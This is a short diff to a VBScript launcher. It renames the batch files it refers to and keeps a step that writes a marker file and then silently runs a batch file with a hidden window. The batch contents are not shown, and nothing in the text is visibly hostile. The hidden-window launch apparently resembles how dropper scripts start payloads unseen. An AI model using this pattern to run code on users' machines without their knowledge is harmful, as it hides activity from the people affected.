@@ -6,7 +6,7 @@ strFolder = objFSO.GetParentFolderName(WScript.ScriptFullName)
 
 ' Define paths for the files
 txtFile = strFolder & "\sts.txt"
-batFile = strFolder & "\get.bat"
+batFile = strFolder & "\one.bat"
 getVbsFile = strFolder & "\get.vbs" ' Path to the .vbs file
 
 ' Check if the txt file exists
@@ -25,7 +25,7 @@ If Not objFSO.FileExists(txtFile) Then
     markerFile.Close
 End If
 
-batFilePath = strFolder & "\heal.bat"
+batFilePath = strFolder & "\get.bat"
 
 ' Execute the batch file silently
 objShell.Run """" & batFilePath & """", 0, False
